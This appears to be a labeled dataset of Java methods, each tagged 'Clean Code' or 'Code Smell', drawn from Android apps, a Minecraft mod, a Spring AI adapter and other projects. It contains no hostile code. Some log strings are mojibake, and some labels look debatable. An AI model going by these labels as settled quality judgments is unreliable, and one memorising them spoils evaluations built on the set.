    return ""Ownership for this data entity and owner already exists"";
  }
  if (message.contains(TITLE_NAME_UNIQUE.getName())) {
    return ""Title with this name already exists"";
  }
  if (message.contains(TERM_NAME_NAMESPACE_UNIQUE.getName())) {
    return ""Term with this name already exists in this namespace"";
  }
  if (message.contains(TERM_ID_OWNER_ID_UNIQUE.getName())) {
    return ""Ownership for this term and owner already exists"";
  }
  log.error(message);
  return ""Database constraint violation"";
}
",0,Clean Code
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.storiesListUpdated) {
    StoriesController.StoriesList list=(StoriesController.StoriesList)args[0];
    if (storiesList == list) {
      PeerStoriesView peerStoriesView=getCurrentPeerView();
      storiesViewPager.setDays(storiesList.dialogId,storiesList.getDays(),currentAccount);
      if (selfStoryViewsView != null) {
        TL_stories.StoryItem currentSelectedStory=selfStoryViewsView.getSelectedStory();
        ArrayList<TL_stories.StoryItem> storyItems=new ArrayList<>();
        int selectedPosition=0;
        for (int i=0; i < storiesList.messageObjects.size(); i++) {
          if (currentSelectedStory != null && currentSelectedStory.id == storiesList.messageObjects.get(i).storyItem.id) {
            selectedPosition=i;
          }
          storyItems.add(storiesList.messageObjects.get(i).storyItem);
        }
        selfStoryViewsView.setItems(storiesList.dialogId,storyItems,selectedPosition);
      }
    }
  }
 else   if (id == NotificationCenter.storiesUpdated) {
    if (placeProvider instanceof StoriesListPlaceProvider) {
      StoriesListPlaceProvider storiesListPlaceProvider=(StoriesListPlaceProvider)placeProvider;
      if (!storiesListPlaceProvider.hasPaginationParams || storiesListPlaceProvider.onlySelfStories) {
        return;
      }
      StoriesController storiesController=MessagesController.getInstance(currentAccount).getStoriesController();
      ArrayList<TL_stories.PeerStories> allStories=storiesListPlaceProvider.hiddedStories ? storiesController.getHiddenList() : storiesController.getDialogListStories();
      boolean changed=false;
      ArrayList<Long> dialogs=storiesViewPager.getDialogIds();
      for (int i=0; i < allStories.size(); i++) {
        TL_stories.PeerStories userStories=allStories.get(i);
        long dialogId=DialogObject.getPeerDialogId(userStories.peer);
        if (storiesListPlaceProvider.onlyUnreadStories && !storiesController.hasUnreadStories(dialogId)) {
          continue;
        }
        if (!dialogs.contains(dialogId)) {
          dialogs.add(dialogId);
          changed=true;
        }
      }
      if (changed) {
        storiesViewPager.getAdapter().notifyDataSetChanged();
      }
    }
    if (selfStoryViewsView != null) {
      selfStoryViewsView.selfStoriesPreviewView.update();
    }
  }
 else   if (id == NotificationCenter.openArticle || id == NotificationCenter.articleClosed) {
    updatePlayingMode();
    if (id == NotificationCenter.openArticle) {
      if (playerHolder != null) {
        playerSavedPosition=playerHolder.currentPosition;
        playerHolder.release(null);
        playerHolder=null;
      }
 else {
        playerSavedPosition=0;
      }
    }
 else     if (!paused) {
      PeerStoriesView peerView=getCurrentPeerView();
      if (peerView != null) {
        getCurrentPeerView().updatePosition();
      }
    }
  }
}",1,Code Smell
"@Override public void onActivityResultFragment(int requestCode,int resultCode,Intent data){
  if (resultCode == Activity.RESULT_OK) {
    if (requestCode == 0 || requestCode == 2) {
      createChatAttachView();
      if (chatAttachAlert != null) {
        chatAttachAlert.getPhotoLayout().onActivityResultFragment(requestCode,data,currentPicturePath);
      }
      currentPicturePath=null;
    }
 else     if (requestCode == 1) {
      if (data == null || data.getData() == null) {
        showAttachmentError();
        return;
      }
      Uri uri=data.getData();
      if (uri.toString().contains(""video"")) {
        String videoPath=null;
        try {
          videoPath=AndroidUtilities.getPath(uri);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        if (videoPath == null) {
          showAttachmentError();
        }
 else {
          File f=new File(videoPath);
          if (!f.canRead()) {
            FileLog.e(""Failed to read input file "" + videoPath + "", copy to private directory"");
            try {
              final File file=AndroidUtilities.generateVideoPath();
              InputStream in=ApplicationLoader.applicationContext.getContentResolver().openInputStream(uri);
              FileOutputStream fos=new FileOutputStream(file);
              byte[] buffer=new byte[8 * 1024];
              int lengthRead;
              while ((lengthRead=in.read(buffer)) > 0) {
                fos.write(buffer,0,lengthRead);
                fos.flush();
              }
              in.close();
              fos.close();
              videoPath=file.getAbsolutePath();
            }
 catch (            Exception ex) {
              FileLog.e(ex);
              showAttachmentError();
            }
          }
        }
        if (paused) {
          startVideoEdit=videoPath;
        }
 else {
          openVideoEditor(videoPath,null);
        }
      }
 else {
        if (editingMessageObject == null && chatMode == MODE_SCHEDULED) {
          AlertsCreator.createScheduleDatePickerDialog(getParentActivity(),dialog_id,(notify,scheduleDate) -> {
            fillEditingMediaWithCaption(null,null);
            SendMessagesHelper.prepareSendingPhoto(getAccountInstance(),null,uri,dialog_id,replyingMessageObject,getThreadMessage(),replyingQuote,null,null,null,null,0,editingMessageObject,notify,scheduleDate,chatMode,quickReplyShortcut,getQuickReplyId());
          }
,themeDelegate);
        }
 else {
          ArrayList<SendMessagesHelper.SendingMediaInfo> photos=new ArrayList<>();
          SendMessagesHelper.SendingMediaInfo info=new SendMessagesHelper.SendingMediaInfo();
          info.uri=uri;
          photos.add(info);
          openPhotosEditor(photos,null);
        }
      }
      afterMessageSend();
    }
 else     if (requestCode == 21) {
      if (data == null) {
        showAttachmentError();
        return;
      }
      if (data.getData() != null) {
        sendUriAsDocument(data.getData());
      }
 else       if (data.getClipData() != null) {
        ClipData clipData=data.getClipData();
        for (int i=0; i < clipData.getItemCount(); i++) {
          sendUriAsDocument(clipData.getItemAt(i).getUri());
        }
      }
 else {
        showAttachmentError();
      }
      if (chatAttachAlert != null) {
        chatAttachAlert.dismiss();
      }
      afterMessageSend();
    }
 else     if (requestCode == 117) {
      selectAndShareMyKey(data);
    }
 else     if (requestCode == 118) {
      shareMyKey(data);
    }
  }
}",1,Code Smell
"@Override public void afterCycle(boolean lastCycle){
  boolean detectedChangeInThisCycle=false;
  Map<SourceFile,SourceFile> thisCycleEdits=new HashMap<>();
  Map<Path,SourceFile> thisCycleGenerated=new HashMap<>();
  Set<SourceFile> thisCycleDeleted=new HashSet<>();
  for (  Result result : getChangeset().getAllResults()) {
    SourceFile before=null;
    SourceFile after=result.getAfter();
    Path sourcePath=result.getAfter() != null ? after.getSourcePath() : result.getBefore().getSourcePath();
    if (result.getBefore() == null) {
      before=after == null ? null : lastCycleGenerated.get(sourcePath);
    }
 else {
      if (after == null && lastCycleDeleted.contains(result.getBefore())) {
        before=result.getBefore();
        after=before;
      }
      if (before == null) {
        before=lastCycleEdits.getOrDefault(result.getBefore(),result.getBefore());
      }
    }
    if (before != null && after != null) {
      thisCycleEdits.put(before,after);
      if (!detectedChangeInThisCycle && before != after) {
        detectedChangeInThisCycle=true;
        cyclesThatResultedInChanges++;
      }
      if (cyclesThatResultedInChanges > expectedCyclesThatMakeChanges) {
        assertThat(after.printAllTrimmed()).as(""Expected recipe to complete in "" + expectedCyclesThatMakeChanges + "" cycle""+ (expectedCyclesThatMakeChanges == 1 ? """" : ""s"")+ "", ""+ ""but took at least one more cycle. Between the last two executed cycles there were changes to \""""+ before.getSourcePath()+ ""\"""").isEqualTo(before.printAllTrimmed());
      }
    }
 else     if (before == null && after != null) {
      thisCycleGenerated.put(sourcePath,after);
      if (!detectedChangeInThisCycle) {
        detectedChangeInThisCycle=true;
        cyclesThatResultedInChanges++;
      }
    }
 else     if (before != null) {
      thisCycleDeleted.add(before);
      if (!detectedChangeInThisCycle) {
        detectedChangeInThisCycle=true;
        cyclesThatResultedInChanges++;
      }
    }
  }
  lastCycleEdits=thisCycleEdits;
  lastCycleGenerated=thisCycleGenerated;
  lastCycleDeleted=thisCycleDeleted;
  if (lastCycle) {
    if (cyclesThatResultedInChanges == 0 && expectedCyclesThatMakeChanges > 0) {
      fail(""Recipe was expected to make a change but made no changes."");
    }
 else     if (cyclesThatResultedInChanges != expectedCyclesThatMakeChanges) {
      fail(""Expected recipe to complete in "" + expectedCyclesThatMakeChanges + "" cycle""+ (expectedCyclesThatMakeChanges > 1 ? ""s"" : """")+ "", ""+ ""but took ""+ cyclesThatResultedInChanges+ "" cycle""+ (cyclesThatResultedInChanges > 1 ? ""s"" : """")+ "". ""+ ""This usually indicates the recipe is making changes after it should have stabilized."");
    }
  }
}",1,Code Smell
"@Override public void setRoleAuthCache(Map<Long,List<SysRoleAuth>> rolePermsMap,Map<Long,List<SysRoleAuth>> roleResourceMap){
  roleListMap.clear();
  for (  Long roleId : rolePermsMap.keySet()) {
    List<SysRoleAuth> list=rolePermsMap.get(roleId);
    Set<String> perms=new HashSet<>();
    list.stream().forEach(r -> {
      if (StringUtils.isNotEmpty(r.getPerms())) {
        perms.add(r.getPerms());
      }
    }
);
    if (roleListMap.containsKey(roleId)) {
      SysRoleAuthList sysRoleList=roleListMap.get(roleId);
      if (sysRoleList.getPerms() != null) {
        sysRoleList.getPerms().addAll(perms);
      }
 else {
        sysRoleList.setPerms(perms);
      }
    }
 else {
      SysRoleAuthList sysRoleList=new SysRoleAuthList(roleId,perms,null);
      roleListMap.put(roleId,sysRoleList);
    }
  }
  for (  Long roleId : roleResourceMap.keySet()) {
    List<SysRoleAuth> list=roleResourceMap.get(roleId);
    Set<String> resourceSet=new HashSet<>();
    list.stream().forEach(r -> {
      if (StringUtils.isNotEmpty(r.getResourceCode())) {
        resourceSet.add(r.getResourceCode());
      }
    }
);
    if (roleListMap.containsKey(roleId)) {
      SysRoleAuthList sysRoleList=roleListMap.get(roleId);
      if (sysRoleList.getResourceCode() != null) {
        sysRoleList.getResourceCode().addAll(resourceSet);
      }
 else {
        sysRoleList.setResourceCode(resourceSet);
      }
    }
 else {
      SysRoleAuthList sysRoleList=new SysRoleAuthList(roleId,null,resourceSet);
      roleListMap.put(roleId,sysRoleList);
    }
  }
}
",1,Code Smell
"public static ArrayList<Block> updateQuoteBlocks(Layout layout,ArrayList<Block> blocks){
  return updateQuoteBlocks(layout,blocks,null);
}
public static ArrayList<Block> updateQuoteBlocks(Layout layout,ArrayList<Block> blocks,boolean[] updateLayout){
  if (layout == null) {
    if (blocks != null) {
      blocks.clear();
    }
    return blocks;
  }
  CharSequence text=layout.getText();
  if (text == null || !(text instanceof Spannable)) {
    if (blocks != null) {
      blocks.clear();
    }
    return blocks;
  }
  Spannable spannable=(Spannable)text;
  if (blocks != null) {
    blocks.clear();
  }
  QuoteSpan[] spans=spannable.getSpans(0,spannable.length(),QuoteSpan.class);
  for (int i=0; i < spans.length; ++i) {
    boolean wasLast=spans[i].last;
    Block block=new Block(layout,spannable,spans[i]);
    if (block.span.edit) {
      if (!(block.span.start == 0 || text.charAt(block.span.start - 1) == '\n')) {
        spannable.removeSpan(spans[i]);
        spannable.removeSpan(spans[i].styleSpan);
        continue;
      }
      if (!(block.span.end == text.length() || text.charAt(block.span.end) == '\n')) {
        int newEnd=block.span.end;
        for (; newEnd <= text.length() && !(newEnd == text.length() || text.charAt(newEnd) == '\n'); ++newEnd)         ;
        spannable.removeSpan(spans[i]);
        spannable.removeSpan(spans[i].styleSpan);
        spannable.setSpan(spans[i],block.span.start,newEnd,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
        spannable.setSpan(spans[i].styleSpan,block.span.start,newEnd,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
        block=new Block(layout,spannable,spans[i]);
      }
    }
    if (blocks == null) {
      blocks=new ArrayList<>();
    }
    if (spans[i].last != wasLast && updateLayout != null) {
      updateLayout[0]=true;
    }
    blocks.add(block);
  }
  return blocks;
}",1,Code Smell
"/** 
 * Gets current position of the player. If the player is playing/paused, this method returns current position from  {@link PlayerAdapter}. Otherwise, if the player is fastforwarding/rewinding, the method fake-pauses the  {@link PlayerAdapter} and returns itsown calculated position.
 * @return Current position of the player.
 */
@Override public long getCurrentPosition(){
  int speed;
  if (mPlaybackSpeed == PlaybackControlGlue.PLAYBACK_SPEED_PAUSED || mPlaybackSpeed == PlaybackControlGlue.PLAYBACK_SPEED_NORMAL) {
    return mPlayerAdapter.getCurrentPosition();
  }
 else   if (mPlaybackSpeed >= PlaybackControlGlue.PLAYBACK_SPEED_FAST_L0) {
    if (mIsCustomizedFastForwardSupported) {
      return mPlayerAdapter.getCurrentPosition();
    }
    int index=mPlaybackSpeed - PlaybackControlGlue.PLAYBACK_SPEED_FAST_L0;
    speed=getFastForwardSpeeds()[index];
  }
 else   if (mPlaybackSpeed <= -PlaybackControlGlue.PLAYBACK_SPEED_FAST_L0) {
    if (mIsCustomizedRewindSupported) {
      return mPlayerAdapter.getCurrentPosition();
    }
    int index=-mPlaybackSpeed - PlaybackControlGlue.PLAYBACK_SPEED_FAST_L0;
    speed=-getRewindSpeeds()[index];
  }
 else {
    return -1;
  }
  long position=mStartPosition + (System.currentTimeMillis() - mStartTime) * speed;
  if (position > getDuration()) {
    mPlaybackSpeed=PLAYBACK_SPEED_PAUSED;
    position=getDuration();
    mPlayerAdapter.seekTo(position);
    mStartPosition=0;
    pause();
  }
 else   if (position < 0) {
    mPlaybackSpeed=PLAYBACK_SPEED_PAUSED;
    position=0;
    mPlayerAdapter.seekTo(position);
    mStartPosition=0;
    pause();
  }
  return position;
}",1,Code Smell
"private static List<OsmElement> convertToOsmElements(OsmXml osmInfo){
  List<OsmElement> elements=new ArrayList<>();
  for (  var node : orEmpty(osmInfo.nodes())) {
    var newNode=new OsmElement.Node(node.id(),node.lat(),node.lon());
    elements.add(newNode);
    for (    var tag : orEmpty(node.tags())) {
      newNode.setTag(tag.k(),tag.v());
    }
  }
  for (  var way : orEmpty(osmInfo.ways())) {
    var readerWay=new OsmElement.Way(way.id());
    elements.add(readerWay);
    for (    var tag : orEmpty(way.tags())) {
      readerWay.setTag(tag.k(),tag.v());
    }
    for (    var nodeRef : orEmpty(way.nodeRefs())) {
      readerWay.nodes().add(nodeRef.ref());
    }
  }
  for (  var relation : orEmpty(osmInfo.relation())) {
    var readerRelation=new OsmElement.Relation(relation.id());
    elements.add(readerRelation);
    for (    var tag : orEmpty(relation.tags())) {
      readerRelation.setTag(tag.k(),tag.v());
    }
    for (    var member : orEmpty(relation.members())) {
      readerRelation.members().add(new OsmElement.Relation.Member(null,member.ref(),member.role()));
    }
  }
  return elements;
}
",1,Code Smell
"private static void participate(){
  try {
    String s=AntSportsRpcCall.queryAccount();
    JSONObject jo=new JSONObject(s);
    if (jo.getBoolean(""success"")) {
      double balance=jo.getDouble(""balance"");
      if (balance < 100)       return;
      jo=new JSONObject(AntSportsRpcCall.queryRoundList());
      if (jo.getBoolean(""success"")) {
        JSONArray dataList=jo.getJSONArray(""dataList"");
        for (int i=0; i < dataList.length(); i++) {
          jo=dataList.getJSONObject(i);
          if (!""P"".equals(jo.getString(""status"")))           continue;
          if (jo.has(""userRecord""))           continue;
          JSONArray instanceList=jo.getJSONArray(""instanceList"");
          int pointOptions=0;
          String roundId=jo.getString(""id"");
          String InstanceId=null;
          String ResultId=null;
          for (int j=instanceList.length() - 1; j >= 0; j--) {
            jo=instanceList.getJSONObject(j);
            if (jo.getInt(""pointOptions"") < pointOptions)             continue;
            pointOptions=jo.getInt(""pointOptions"");
            InstanceId=jo.getString(""id"");
            ResultId=jo.getString(""instanceResultId"");
          }
          jo=new JSONObject(AntSportsRpcCall.participate(pointOptions,InstanceId,ResultId,roundId));
          if (jo.getBoolean(""success"")) {
            jo=jo.getJSONObject(""data"");
            String roundDescription=jo.getString(""roundDescription"");
            int targetStepCount=jo.getInt(""targetStepCount"");
            Log.other(""璧拌矾鎸戞垬馃毝馃徎鈥嶁檪锔廩"" + roundDescription + ""]#""+ targetStepCount);
          }
 else {
            Log.recordLog(""璧拌矾鎸戞垬璧�"",jo.toString());
          }
        }
      }
 else {
        Log.recordLog(""queryRoundList"",jo.toString());
      }
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""participate err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"public static ArrayList<DirectedGraphNode> topSort(ArrayList<DirectedGraphNode> graph){
  HashMap<DirectedGraphNode,Integer> indegreeMap=new HashMap<>();
  for (  DirectedGraphNode cur : graph) {
    indegreeMap.put(cur,0);
  }
  for (  DirectedGraphNode cur : graph) {
    for (    DirectedGraphNode next : cur.neighbors) {
      indegreeMap.put(next,indegreeMap.get(next) + 1);
    }
  }
  Queue<DirectedGraphNode> zeroQueue=new LinkedList<>();
  for (  DirectedGraphNode cur : indegreeMap.keySet()) {
    if (indegreeMap.get(cur) == 0) {
      zeroQueue.add(cur);
    }
  }
  ArrayList<DirectedGraphNode> ans=new ArrayList<>();
  while (!zeroQueue.isEmpty()) {
    DirectedGraphNode cur=zeroQueue.poll();
    ans.add(cur);
    for (    DirectedGraphNode next : cur.neighbors) {
      indegreeMap.put(next,indegreeMap.get(next) - 1);
      if (indegreeMap.get(next) == 0) {
        zeroQueue.offer(next);
      }
    }
  }
  return ans;
}",1,Code Smell
"@Override public void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  minecraftProfile=LauncherProfiles.getCurrentProfile();
  MCOptionUtils.load(Tools.getGameDirPath(minecraftProfile).getAbsolutePath());
  Intent gameServiceIntent=new Intent(this,GameService.class);
  ContextCompat.startForegroundService(this,gameServiceIntent);
  initLayout(R.layout.activity_basemain);
  CallbackBridge.addGrabListener(touchpad);
  CallbackBridge.addGrabListener(minecraftGLView);
  if (LauncherPreferences.PREF_ENABLE_GYRO)   mGyroControl=new GyroControl(this);
  if (PREF_USE_ALTERNATE_SURFACE)   getWindow().setBackgroundDrawable(null);
 else   getWindow().setBackgroundDrawable(new ColorDrawable(Color.BLACK));
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)   getWindow().setSustainedPerformanceMode(PREF_SUSTAINED_PERFORMANCE);
  ingameControlsEditorArrayAdapter=new ArrayAdapter<>(this,android.R.layout.simple_list_item_1,getResources().getStringArray(R.array.menu_customcontrol));
  ingameControlsEditorListener=(parent,view,position,id) -> {
switch (position) {
case 0:
      mControlLayout.addControlButton(new ControlData(""New""));
    break;
case 1:
  mControlLayout.addDrawer(new ControlDrawerData());
break;
case 2:
mControlLayout.addJoystickButton(new ControlJoystickData());
break;
case 3:
mControlLayout.openLoadDialog();
break;
case 4:
mControlLayout.openSaveDialog(this);
break;
case 5:
mControlLayout.openSetDefaultDialog();
break;
case 6:
mControlLayout.openExitDialog(this);
}
}
;
MCOptionUtils.MCOptionListener optionListener=MCOptionUtils::getMcScale;
MCOptionUtils.addMCOptionListener(optionListener);
mControlLayout.setModifiable(false);
ContextExecutor.setActivity(this);
bindService(gameServiceIntent,this,0);
}",1,Code Smell
"private GeminiRequest createGeminiRequest(Prompt prompt){
  Set<String> functionsForThisRequest=new HashSet<>();
  GenerationConfig generationConfig=this.generationConfig;
  var generativeModelBuilder=new GenerativeModel.Builder().setModelName(this.defaultOptions.getModel()).setVertexAi(this.vertexAI);
  VertexAiGeminiChatOptions updatedRuntimeOptions=null;
  if (prompt.getOptions() != null) {
    if (prompt.getOptions() instanceof ChatOptions) {
      updatedRuntimeOptions=ModelOptionsUtils.copyToTarget(runtimeOptions,ChatOptions.class,VertexAiGeminiChatOptions.class);
      functionsForThisRequest.addAll(handleFunctionCallbackConfigurations(updatedRuntimeOptions,IS_RUNTIME_CALL));
    }
 else {
      throw new IllegalArgumentException(""Prompt options are not of type ChatOptions: "" + prompt.getOptions().getClass().getSimpleName());
    }
  }
  if (this.defaultOptions != null) {
    functionsForThisRequest.addAll(handleFunctionCallbackConfigurations(this.defaultOptions,!IS_RUNTIME_CALL));
    if (updatedRuntimeOptions == null) {
      updatedRuntimeOptions=VertexAiGeminiChatOptions.builder().build();
    }
    updatedRuntimeOptions=ModelOptionsUtils.merge(updatedRuntimeOptions,this.defaultOptions,VertexAiGeminiChatOptions.class);
  }
  if (updatedRuntimeOptions != null) {
    if (StringUtils.hasText(updatedRuntimeOptions.getModel()) && !updatedRuntimeOptions.getModel().equals(this.defaultOptions.getModel())) {
      generativeModelBuilder.setModelName(updatedRuntimeOptions.getModel());
    }
    generationConfig=toGenerationConfig(updatedRuntimeOptions);
  }
  if (!CollectionUtils.isEmpty(functionsForThisRequest)) {
    List<Tool> tools=this.getFunctionTools(functionsForThisRequest);
    generativeModelBuilder.setTools(tools);
  }
  generativeModelBuilder.setGenerationConfig(generationConfig);
  GenerativeModel generativeModel=generativeModelBuilder.build();
  return new GeminiRequest(toGeminiContent(prompt),generativeModel);
}
",1,Code Smell
"/** 
 * removeBackupClusterTag
 */
public String removeBackupClusterTag(String inlongGroupId){
  InlongGroupEntity oldGroup=inlongGroupMapper.selectByGroupId(inlongGroupId);
  if (oldGroup == null) {
    throw new BusinessException(ErrorCodeEnum.GROUP_NOT_FOUND);
  }
  String extParams=oldGroup.getExtParams();
  if (StringUtils.isEmpty(extParams)) {
    return inlongGroupId;
  }
  JsonObject extParamsObj=fromJsonToJson(extParams);
  if (!extParamsObj.has(KEY_BACKUP_CLUSTER_TAG)) {
    return inlongGroupId;
  }
  final String oldClusterTag=extParamsObj.get(KEY_BACKUP_CLUSTER_TAG).getAsString();
  extParamsObj.remove(KEY_BACKUP_CLUSTER_TAG);
  extParamsObj.remove(KEY_BACKUP_TOPIC);
  String newExtParams=extParamsObj.toString();
  oldGroup.setExtParams(newExtParams);
  int rowCount=inlongGroupMapper.updateByIdentifierSelective(oldGroup);
  if (rowCount != InlongConstants.AFFECTED_ONE_ROW) {
    LOGGER.error(""inlong group has already updated with group id={}, curVersion={}"",oldGroup.getInlongGroupId(),oldGroup.getVersion());
    throw new BusinessException(ErrorCodeEnum.CONFIG_EXPIRED);
  }
  Map<String,InlongClusterEntity> clusterMap=new HashMap<>();
  ClusterPageRequest clusterRequest=new ClusterPageRequest();
  List<InlongClusterEntity> clusters=clusterMapper.selectByCondition(clusterRequest);
  clusters.forEach((v) -> {
    clusterMap.put(v.getName(),v);
  }
);
  SinkPageRequest request=new SinkPageRequest();
  request.setInlongGroupId(inlongGroupId);
  List<StreamSinkEntity> streamSinks=streamSinkMapper.selectByCondition(request);
  List<StreamSinkEntity> deleteStreamSinks=new ArrayList<>();
  for (  StreamSinkEntity streamSink : streamSinks) {
    String clusterName=streamSink.getInlongClusterName();
    InlongClusterEntity cluster=clusterMap.get(clusterName);
    if (cluster == null) {
      continue;
    }
    if (StringUtils.equals(oldClusterTag,cluster.getClusterTags())) {
      deleteStreamSinks.add(streamSink);
    }
  }
  deleteStreamSinks.forEach((v) -> {
    streamSinkMapper.deleteById(v.getId());
  }
);
  return inlongGroupId;
}
",1,Code Smell
"public void updateMessageReactions(long dialogId,int msgId,TLRPC.TL_messageReactions reactions){
  storageQueue.postRunnable(() -> {
    SQLiteCursor cursor=null;
    try {
      final long selfId=getUserConfig().getClientUserId();
      TLRPC.TL_messageReactions pastReactions=null;
      long topicId=0;
      database.beginTransaction();
      for (int i=0; i < 2; i++) {
        if (i == 0) {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data FROM messages_v2 WHERE mid = %d AND uid = %d"",msgId,dialogId));
        }
 else {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data FROM messages_topics WHERE mid = %d AND uid = %d"",msgId,dialogId));
        }
        if (cursor.next()) {
          NativeByteBuffer data=cursor.byteBufferValue(0);
          if (data != null) {
            TLRPC.Message message=TLRPC.Message.TLdeserialize(data,data.readInt32(false),false);
            if (message != null) {
              message.readAttachPath(data,getUserConfig().clientUserId);
              data.reuse();
              if (pastReactions == null) {
                pastReactions=message.reactions;
                topicId=MessageObject.getSavedDialogId(selfId,message);
              }
              MessageObject.updateReactions(message,reactions);
              SQLitePreparedStatement state;
              if (i == 0) {
                state=database.executeFast(""UPDATE messages_v2 SET data = ? WHERE mid = ? AND uid = ?"");
              }
 else {
                state=database.executeFast(""UPDATE messages_topics SET data = ? WHERE mid = ? AND uid = ?"");
              }
              MessageObject.normalizeFlags(message);
              NativeByteBuffer data2=new NativeByteBuffer(message.getObjectSize());
              message.serializeToStream(data2);
              state.requery();
              state.bindByteBuffer(1,data2);
              state.bindInteger(2,msgId);
              state.bindLong(3,dialogId);
              state.step();
              data2.reuse();
              state.dispose();
              if (selfId == dialogId) {
                database.executeFast(String.format(Locale.US,""DELETE FROM tag_message_id WHERE mid = %d"",message.id)).stepThis().dispose();
                SQLitePreparedStatement state_tag_message=database.executeFast(""REPLACE INTO tag_message_id VALUES(?, ?, ?, ?)"");
                bindMessageTags(state_tag_message,message);
                state_tag_message.dispose();
              }
            }
 else {
              data.reuse();
            }
          }
        }
        cursor.dispose();
        cursor=null;
      }
      database.commitTransaction();
      if (dialogId == selfId && pastReactions != null) {
        onReactionsUpdate(topicId,pastReactions,reactions);
      }
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (database != null) {
        database.commitTransaction();
      }
      if (cursor != null) {
        cursor.dispose();
      }
    }
  }
);
}",1,Code Smell
"@Override public void collectCandidateKeywords(){
  String query=keyword2Query(targetKeyword);
  String url=""https://c.y.qq.com/soso/fcgi-bin/client_search_cp?"" + ""ct=24&qqmusic_ver=1298&new_json=1&remoteplace=txt.yqq.center&"" + ""searchid=46343560494538174&t=0&aggr=1&cr=1&catZhida=1&lossless=0&""+ ""flag_qc=0&p=1&n=10&w="" + query + ""&""+ ""g_tk_new_20200303=5381&g_tk=5381&loginUin=0&hostUin=0&""+ ""format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0"";
  try {
    HttpURLConnection connection=(HttpURLConnection)new URL(url).openConnection();
    connection.setRequestMethod(""GET"");
    connection.connect();
    int responseCode=connection.getResponseCode();
    if (responseCode == HttpURLConnection.HTTP_OK) {
      byte[] content=ReadStream.read(connection.getInputStream());
      String str=new String(content);
      JSONObject jsonObject=JSONObject.parseObject(str);
      if (jsonObject.getIntValue(""code"") == 0) {
        JSONArray candidates=jsonObject.getJSONObject(""data"").getJSONObject(""song"").getJSONArray(""list"");
        for (        Object infoObj : candidates) {
          JSONObject songJsonObject=(JSONObject)infoObj;
          int pay=songJsonObject.getJSONObject(""pay"").getIntValue(""pay_play"");
          if (pay != 0) {
            continue;
          }
          int fnote=songJsonObject.getIntValue(""fnote"");
          if (fnote == 4002) {
            continue;
          }
          JSONObject files=songJsonObject.getJSONObject(""file"");
          if (files.getIntValue(""size_128"") == 0 && files.getIntValue(""size_320"") == 0) {
            continue;
          }
          String songName=songJsonObject.getString(""title"");
          Keyword candidateKeyword=new Keyword();
          candidateKeyword.songName=songName;
          JSONArray singersObj=songJsonObject.getJSONArray(""singer"");
          for (          Object singerObj : singersObj) {
            String singer=((JSONObject)singerObj).getString(""name"");
            candidateKeyword.singers.add(singer);
          }
          songJsonObjects.add(songJsonObject);
          candidateKeywords.add(candidateKeyword);
        }
      }
    }
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
}",1,Code Smell
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == android.R.id.home) {
    finish();
  }
 else   if (id == R.id.action_sort_by_app_label) {
    setSortBy(SortOrder.SORT_BY_APP_LABEL);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_last_used) {
    setSortBy(SortOrder.SORT_BY_LAST_USED);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_mobile_data) {
    setSortBy(SortOrder.SORT_BY_MOBILE_DATA);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_package_name) {
    setSortBy(SortOrder.SORT_BY_PACKAGE_NAME);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_screen_time) {
    setSortBy(SortOrder.SORT_BY_SCREEN_TIME);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_times_opened) {
    setSortBy(SortOrder.SORT_BY_TIMES_OPENED);
    item.setChecked(true);
  }
 else   if (id == R.id.action_sort_by_wifi_data) {
    setSortBy(SortOrder.SORT_BY_WIFI_DATA);
    item.setChecked(true);
  }
 else   return super.onOptionsItemSelected(item);
  return true;
}
",1,Code Smell
"/** 
 * Set up a map of noteblocks positions
 */
private void setupNoteblocksMap(){
  noteBlockPositions.clear();
  List<Note> uniqueNotesToUse=new ArrayList<>(song.getRequirements());
  Map<Instrument,List<BlockPos>> incorrectNoteBlocks=new HashMap<>();
  for (  var entry : scannedNoteblocks.asMap().entrySet()) {
    Note note=entry.getKey();
    List<BlockPos> noteblocks=new ArrayList<>(entry.getValue());
    if (uniqueNotesToUse.contains(note)) {
      noteBlockPositions.put(note,noteblocks.removeFirst());
      uniqueNotesToUse.remove(note);
    }
    if (!noteblocks.isEmpty()) {
      if (!incorrectNoteBlocks.containsKey(note.getInstrument())) {
        incorrectNoteBlocks.put(note.getInstrument(),new ArrayList<>());
      }
      incorrectNoteBlocks.get(note.getInstrument()).addAll(noteblocks);
    }
  }
  for (  var entry : incorrectNoteBlocks.entrySet()) {
    List<BlockPos> positions=entry.getValue();
    if (mode.get() == NotebotUtils.NotebotMode.ExactInstruments) {
      Instrument inst=entry.getKey();
      List<Note> foundNotes=uniqueNotesToUse.stream().filter(note -> note.getInstrument() == inst).collect(Collectors.toList());
      if (foundNotes.isEmpty())       continue;
      for (      BlockPos pos : positions) {
        if (foundNotes.isEmpty())         break;
        Note note=foundNotes.removeFirst();
        noteBlockPositions.put(note,pos);
        uniqueNotesToUse.remove(note);
      }
    }
 else {
      for (      BlockPos pos : positions) {
        if (uniqueNotesToUse.isEmpty())         break;
        Note note=uniqueNotesToUse.removeFirst();
        noteBlockPositions.put(note,pos);
      }
    }
  }
  if (!uniqueNotesToUse.isEmpty()) {
    for (    Note note : uniqueNotesToUse) {
      warning(""Missing note: "" + note.getInstrument() + "", ""+ note.getNoteLevel());
    }
    warning(uniqueNotesToUse.size() + "" missing notes!"");
  }
}
",1,Code Smell
"public Result<Void> checkFieldLegal(){
  StringBuilder sb=new StringBuilder();
